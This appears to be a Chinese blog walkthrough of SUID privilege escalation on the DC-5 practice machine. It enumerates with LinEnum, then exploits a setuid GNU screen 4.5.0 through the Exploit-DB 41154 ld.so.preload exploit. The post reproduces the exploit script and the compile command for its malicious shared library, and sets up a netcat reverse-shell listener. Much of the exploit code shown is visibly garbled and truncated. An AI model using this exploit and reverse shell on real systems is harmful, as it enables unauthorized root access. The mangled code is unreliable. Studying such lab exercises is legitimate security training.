突破内外网边界后，攻击者的选择的提取方式有很多，以下列举了Linux权限提升攻击者最为常见的下手点，如：

1.  内核漏洞
2.  定时任务
3.  Suid文件
4.  Sudo配置错误
5.  NFS共享
6.  第三方服务

本文主要讲其中的SUID文件提取，故靶机的网络内外网边界突破流程便不再赘述。

> ❝
> 
> SUID代表设置的用户ID，是一种Linux功能，当一个具有执行权限的文件设置SUID权限后，用户执行命令操作这个文件时将以文件所有者的身份执行。SUID权限只在该程序执行过程中有效，也就是说身份改变只在程序执行过程中有效（带个头套，伪装）。
> 
> 例如，Linux ping命令通常需要root权限才能打开原始网络套接字。通过将ping程序标记为SUID（所有者为root），只要低特权用户执行ping程序，便会以root特权执行ping。
> 
> \-rwsr-xr-x，这个s就是SUID
> 
> ❞

我这里选择使用蚁剑来攻击，主要是因为蚁剑在虚拟终端和文件操作比较方便，另外，界面更容易上手一些。连上蚁剑之后，打开虚拟终端，使用**「LinEnum.sh」**来收集要提权的机器上的信息。LinEnum.sh脚本主要用来收集Linux上的信息。只需将.sh文件传入目标机中并运行即可，详细命令在其官网上有介绍。下载地址：`https://github.com/rebootuser/LinEnum`

我把这个脚本传到了 **「/tmp」**目录下，然后输入命令直接执行该脚本。

```

sh /tmp/LinEnum.sh
```

直接执行可以调出很多信息，洋洋洒洒接近1000行，直接把它复制下来，在vscode里面查看。**「ctrl+F」**直接搜索 **「-rwsr-xr-x」**发现十四个结果，其中 **「/bin/screen-4.5.0」**特别显眼，因为screen的这个版本已经被证实存在提取漏洞。

![](../Images/65c0cd2e0245bfb61e3acc6a6dffba16.png)

> ❝
> 
> **「Screen」**是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。流行的Linux发行版（例如Red Hat Enterprise Linux）通常会自带screen实用程序，如果没有的话，可以从GNU screen的官方网站下载。
> 
> ❞

该漏洞详情参见：`https://www.exploit-db.com/exploits/41154`，该网站上可以下载EXP。如果你不知道互联网上该从何查找，也可以直接使用kali的**「Exploit-DB」**，直接搜索该版本即可，命令为：`searchsploit screen 4.5.0`。如图，**「linux/local/41154.sh」**即为EXP，**「linux/local/41152.txt」**为POC。这两个文件都在`/usr/share/exploitdb/exploits/`目录下。

![](../Images/872433383122a8d059cd9725b3ae0f09.png)

该提权漏洞的EXP如下：

```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

"/tmp/rootshell"
, 0, 0);"/tmp/rootshell"
, 04755);"/etc/ld.so.preload"
);printf("[+] done!\n"

);#include <stdio.h>

"/bin/sh"

, NULL, NULL);echo "[+] Now we create our /etc/ld.so.preload file..."
cd
 /etcumask 000 # because
echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
# screen itself is setuid, so... 


```

依据漏洞的描述，要将其中的两段C语言代码截取出来并编译，编译后的文件名分别是**「libhax.c」**和**「rootshell」**，然后上传到 **「/tmp」**文件夹；截取C语言代码段之后剩余的部分整理后保存为`.sh`文件，同样上传到 **「/tmp」**文件夹，最后执行该`.sh`文件即可。

两个文件的编译命令如下：

```


gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

整理后的**「dc.sh」**文件如下：

```
echo "[+] First, we create our shell and library..."
cd
 /etcumask 000 # because
echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
# screen itself is setuid, so... 


```

将得到的三个文件通过蚁剑上传至 **「/tmp」**文件夹，然后通过 `chmod +x dc5.sh`对 **「dc5.sh」**增加可执行权限，最后执行该文件即可。

![](../Images/457d212502ac29b58cc08a16b8838010.png)

至此即为提取成功。值得一提的是，前面的步骤都可以使用蚁剑的虚拟终端进行操作，但是最后的一步必须要使用靶机的bash外壳，也就是说，需要反弹shell，这里给出相关的三条命令：

```
nc -lvvp 4444 #该命令在kali上运行，4444是监听端口，可随意设置
#该命令在虚拟终端里运行，ip与端口为kali提前设置好的
'import pty;pty.spawn("/bin/bash")' #成功得到shell后，切换到bash外壳

```

如图，当提权成功之后，输入命令行的身份标识会发生变化，这也是提取成功的一个表现。

![](../Images/5d36ac3f208aafe91c44169c9e02c8f1.png)

对于dc-5靶机来说，到这里就彻底结束了，最后有一个类似于CTF的flag，可以打开看看，也算是个小成就。

![](../Images/fa0b7380c2050d5303213bee56009d87.png)

# 小结

SUID提取演示就此结束。本次提取主要利用了**「screen4.5.0」**的提权漏洞，这个漏洞产生的原因就是设置了不当的SUID权限，可见合理设置访问权限对系统的安全性非常重要。
